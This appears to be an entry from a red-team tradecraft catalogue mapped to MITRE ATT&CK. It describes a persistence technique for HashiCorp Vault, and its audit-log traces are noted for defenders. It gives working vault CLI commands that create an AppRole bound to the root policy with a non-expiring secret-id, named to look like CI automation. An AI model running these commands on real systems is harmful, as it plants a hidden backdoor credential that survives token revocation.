---
id: vault-approle-backdoor
title: Rogue AppRole (durable machine auth to Vault)
section: HashiCorp Vault / secrets
phase: Persistence
attack:
  tactic: TA0003
  techniques: [T1098]
platform: [vault]
source: HashiCorp Vault persistence (rogue AppRole / auth backdoor)
pair: vault-approle-audit
---

Mint your own machine identity: enable the AppRole auth method (if absent) and create a
role bound to a powerful policy with a non-expiring secret-id — a long-lived,
non-interactive credential that keeps issuing tokens after the compromised operator's
own token is revoked. Reads like ordinary CI automation. Enabling the method writes
`request.operation=update` on `sys/auth/approle`; creating the role writes create/update
on `auth/approle/role/<name>`. (Secrets store — no slots.)

```sh
# enable approle (if needed) and create a wide-privilege role with a non-expiring secret-id
vault auth enable approle 2>/dev/null
vault write auth/approle/role/ci-cache token_policies=root token_ttl=768h secret_id_ttl=0
vault read auth/approle/role/ci-cache/role-id && vault write -f auth/approle/role/ci-cache/secret-id
```
